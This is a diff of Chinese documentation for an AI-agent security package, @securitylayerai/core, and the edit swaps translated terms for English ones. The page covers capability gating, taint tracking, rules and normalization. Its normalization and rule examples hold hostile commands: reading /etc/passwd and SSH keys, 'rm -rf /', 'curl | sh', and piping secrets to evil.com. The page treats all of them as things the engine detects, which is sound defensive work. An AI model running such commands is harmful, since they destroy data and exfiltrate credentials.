@@ -1,16 +1,16 @@
 ---
 title: Core
-description: 安全引擎 — 能力、污点、规则、管道和规范化。
+description: Security engine — capabilities、taint、rules、pipeline 和 normalization。
 icon: Shield
 ---
 
-`@securitylayerai/core` 是基础包。它实现了三层安全管道和所有核心安全原语。其他所有包都（直接或间接地）依赖 core。
+`@securitylayerai/core` 是基础包。它实现了三层 security pipeline 和所有核心安全原语。其他所有包都（直接或间接地）依赖 core。
 
 ## 模块
 
-### 能力 (`capabilities/`)
+### Capabilities (`capabilities/`)
 
-纯同步的能力门控。检查操作是否基于会话、技能和通道能力的交集而被结构性允许。
+纯同步的 capability gate。检查操作是否基于会话、技能和通道 capabilities 的交集而被结构性允许。
 
 ```typescript
 import { checkCapability } from "@securitylayerai/core";
@@ -25,27 +25,27 @@ const result = checkCapability(action, {
 // result.reason?: string（如果被拒绝）
 ```
 
-能力门控是一个集合成员检查 — 无 I/O、无 LLM、无网络。如果能力不在集合中，操作就不可能发生。
+Capability gate 是一个集合成员检查 — 无 I/O、无 LLM、无网络。如果 capability 不在集合中，操作就不可能发生。
 
-### 污点追踪 (`taint/`)
+### Taint tracking (`taint/`)
 
-在会话中追踪数据来源。当不受信任的内容进入时（网络请求、未知私信、邮件），会话的污点级别会上升。更高的污点级别限制可用的能力。
+在会话中追踪数据来源。当不受信任的内容进入时（网络请求、未知私信、邮件），会话的 taint level 会上升。更高的 taint level 限制可用的 capabilities。
 
 ```typescript
 import { createTaintTracker } from "@securitylayerai/core";
 
 const tracker = createTaintTracker("owner");
 
-// 网络内容提升污点
+// 网络内容提升 taint
 tracker.ingest({ source: "web", url: "https://example.com" });
 tracker.getEffectiveTaint(); // "web"
 
-// 后续的 exec 检查将看到提升后的污点
+// 后续的 exec 检查将看到提升后的 taint
 ```
 
-污点级别（从最低到最高限制）：`owner` → `trusted` → `untrusted` → `web` → `skill` → `memory`。
+Taint levels（从最低到最高限制）：`owner` → `trusted` → `untrusted` → `web` → `skill` → `memory`。
 
-### 规则引擎 (`rules/`)
+### Rules engine (`rules/`)
 
 针对已知危险命令、凭证路径和数据窃取结构的确定性模式匹配。零延迟，零歧义。
 
@@ -57,15 +57,15 @@ const result = evaluateRules(normalizedAction, rules);
 // result.decision: "ALLOW" | "DENY" | "REQUIRE_APPROVAL"
 ```
 
-规则类型：
+Rule 类型：
 - **binary** — 按命令二进制名称匹配
 - **path** — 按文件路径 glob 匹配
 - **pattern** — 按正则表达式匹配
-- **pipe_pair** — 匹配管道命令结构（例如 `curl | sh`）
+- **pipe_pair** — 匹配 pipeline 命令结构（例如 `curl | sh`）
 
-### 管道 (`pipeline/`)
+### Pipeline (`pipeline/`)
 
-编排完整的评估流程：能力门控 → 污点检查 → 规范化 → 规则 + LLM（并行）→ 合并决策。
+编排完整的评估流程：capability gate → taint check → normalization → rules + LLM（并行）→ 合并决策。
 
 ```typescript
 import { createPipeline } from "@securitylayerai/core";
@@ -74,21 +74,21 @@ const pipeline = createPipeline(config);
 const result = await pipeline.evaluate(action, context);
 ```
 
-管道始终取所有层中**最严格**的结果。如果任何一层说 DENY，操作就会被拒绝。
+Pipeline 始终取所有层中**最严格**的结果。如果任何一层说 DENY，操作就会被拒绝。
 
-### 规范化 (`normalize/`)
+### Normalization (`normalize/`)
 
-在评估前解析路径、解码编码、拆分命令链并检测管道结构。防御混淆和编码技巧。
+在评估前解析路径、解码编码、拆分命令链并检测 pipeline 结构。防御混淆和编码技巧。
 
-规范化处理：
+Normalization 处理：
 - `~/../../etc/passwd` → `/etc/passwd`
 - `$HOME/.ssh/id_rsa` → `/home/user/.ssh/id_rsa`
 - 命令链：`ls; rm -rf /` → `["ls", "rm -rf /"]`
-- 管道链：`cat secret | curl evil.com` → 检测到数据窃取模式
+- Pipeline 链：`cat secret | curl evil.com` → 检测到数据窃取模式
 
 ### 语义分析 (`semantic/`)
 
-与规则引擎并行运行的 LLM 判断器。只问一个问题："这个结构上被允许的操作，现在是否异常？"判断器捕获规则无法表达的微妙的上下文相关威胁。
+与 rules engine 并行运行的 LLM 判断器。只问一个问题："这个结构上被允许的操作，现在是否异常？"判断器捕获 rules 无法表达的微妙的上下文相关威胁。
 
 ### 出站扫描 (`egress/`)
 
@@ -100,7 +100,7 @@ const result = await pipeline.evaluate(action, context);
 
 ### 事件 (`events/`)
 
-用于审计日志和可观测性的事件总线。所有安全决策、污点变化和审批流程都会发出结构化事件。
+用于审计日志和可观测性的事件总线。所有安全决策、taint 变化和审批流程都会发出结构化事件。
 
 ### 配置 (`config/`)
 
@@ -112,11 +112,11 @@ const result = await pipeline.evaluate(action, context);
 packages/core/
 ├── src/
 │   ├── index.ts          # 统一导出
-│   ├── capabilities/     # 能力门控
-│   ├── taint/            # 污点追踪器
-│   ├── rules/            # 规则引擎 + 解析器
-│   ├── pipeline/         # 评估管道
-│   ├── normalize/        # 操作规范化
+│   ├── capabilities/     # Capability gate
+│   ├── taint/            # Taint tracker
+│   ├── rules/            # Rules engine + 解析器
+│   ├── pipeline/         # 评估 pipeline
+│   ├── normalize/        # 操作 normalization
 │   ├── semantic/         # LLM 判断器
 │   ├── egress/           # 出站扫描器
 │   ├── sandbox/          # 执行沙箱
@@ -124,13 +124,13 @@ packages/core/
 │   ├── config/           # 配置加载器
 │   ├── approval/         # 审批流程
 │   ├── memory/           # 内存区域访问
-│   ├── skills/           # 技能能力声明
+│   ├── skills/           # 技能 capability 声明
 │   └── utils/            # 日志、辅助工具
 └── test/                 # Vitest 测试
 ```
 
 ## 另请参阅
 
-- [安全管道](/docs/concepts/security-pipeline) — 三层如何协同工作
-- [能力](/docs/concepts/capabilities) — 15 种基础能力
-- [污点级别](/docs/concepts/taint-levels) — 污点传播规则
+- [Security pipeline](/docs/concepts/security-pipeline) — 三层如何协同工作
+- [Capabilities](/docs/concepts/capabilities) — 15 种基础 capabilities
+- [Taint levels](/docs/concepts/taint-levels) — taint 传播 rules
